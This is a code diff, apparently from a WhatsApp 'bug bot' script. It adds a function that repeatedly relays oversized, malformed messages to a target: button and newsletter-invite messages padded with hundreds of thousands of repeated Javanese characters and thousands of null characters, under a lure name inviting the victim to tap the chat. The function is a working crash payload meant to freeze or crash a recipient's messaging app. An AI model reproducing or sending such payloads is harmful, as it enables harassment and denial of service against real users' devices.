@@ -3329,7 +3329,7 @@ Status      : Success
             
             for (let i = 0; i < 2; i++) {
                 try {
-                    await OfferVideoCall(sock, target);
+                    await VnXNewOneButtonsBlnk(sock, target);
                     await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3883,15 +3883,42 @@ async function P7X(sock, target) {
   });
 }
 
-async function OfferVideoCall(target) {
-    try {
-        await sock.offerCall(target, {
-            video: true
-        });
-        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
-    } catch (error) {
-        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
+async function VnXNewOneButtonsBlnk(sock, target) {
+  const VnXOneButton = [
+    {
+      buttonId: "VnX",
+      buttonText: {
+        displayText: "ꦽ".repeat(80000)
+      },
+      type: 1
     }
+  ];
+
+ const vnxbtns = {
+   buttonsMessage: {
+      contentText: "ꦾ".repeat(250000),
+      footerText: "\u0000".repeat(15000),
+      buttons: VnXOneButton,
+      headerType: 1
+    }
+  };
+   
+    const VnXblnksltter = {
+       newsletterAdminInviteMessage: {
+          newsletterJid: "120363321780343299@newsletter",
+          newsletterName: "Coba Kamu Pencet Chat Ini 🍁" + "ꦽꦾ".repeat(250000),
+          caption: "VnX Bng" + "ꦽꦾ".repeat(250000),
+          inviteExpiration: "9282682616283736",    
+       }
+    };
+  
+   await sock.relayMessage(target, VnXblnksltter, { 
+    participant: { jid: target } 
+  });
+    
+    await sock.relayMessage(target, vnxbtns, { 
+    participant: { jid: target } 
+  });
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
